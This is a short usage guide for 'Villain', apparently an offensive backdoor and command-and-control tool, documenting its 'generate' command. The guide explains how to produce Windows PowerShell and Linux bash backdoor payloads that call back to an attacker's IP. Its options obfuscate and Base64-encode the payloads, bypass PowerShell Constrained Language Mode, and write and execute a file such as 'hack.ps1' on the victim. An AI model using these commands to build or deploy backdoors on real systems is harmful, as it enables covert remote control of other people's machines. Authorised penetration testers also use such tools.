# Usage Guide
## Table of contents
1. [Generate Backdoor Payloads](Generate-Backdoor-Payloads)
2. 


## Generate Backdoor Payloads
Use the "generate" prompt command to generate backdoor payloads for Windows or Linux machines. 

```
generate os=windows lhost=<IP or IFACE> [ exec_outfile=<REMOTE PATH> domain=<DOMAIN>] [ obfuscate encode constraint_mode ]
```

The backdoors are designed to start as new background processes. Currently supported types of backdoors:  
 - for Windows: Powershell 
 - for Linux: bash

#### Available arguments for the "generate" prompt command:
| Argument        | Required | Supported OS | Requires Input Val | Description |
|-----------------|:-------:|:-------------:|:------------------:|------------------------|
| os              | True    | All           | Yes                | The OS type of the backdoor. |
| lhost           | True    | N/A           | Yes                | Your local IP or Interface. |
| domain          | Depends | N/A           | Yes                | If you have provided trusted cert and priv_key files to start Villain with SSL, you can provide domain instead of lhost. |
| obfuscate       | False   | Windows       | No                 | Auto-obfuscate the generated payload. This aims to assist you, not always do the job for you. |
| encode          | False   | Windows       | No                 | Base64 encode the generated payload. |
| exec_outfile    | False   | Windows       | Yes                | Provide a file path on the victim to write & execute commands from (instead of using IEX) |
| constraint_mode | False   | Windows       | No                 | Make the generated payload work on PowerShell Constraint Language Mode. By using this option you sacrifice a bit of the decoding clarity of your shell. |

#### Examples:
```
# For Windows:
Villain > generate os=windows lhost=eth0 obfuscate
Villain > generate os=windows lhost=192.168.12.36 exec_outfile="C:\Users\\\$env:USERNAME\.local\hack.ps1" encode

# For Linux:
Villain > generate os=linux lhost=192.168.12.62
```
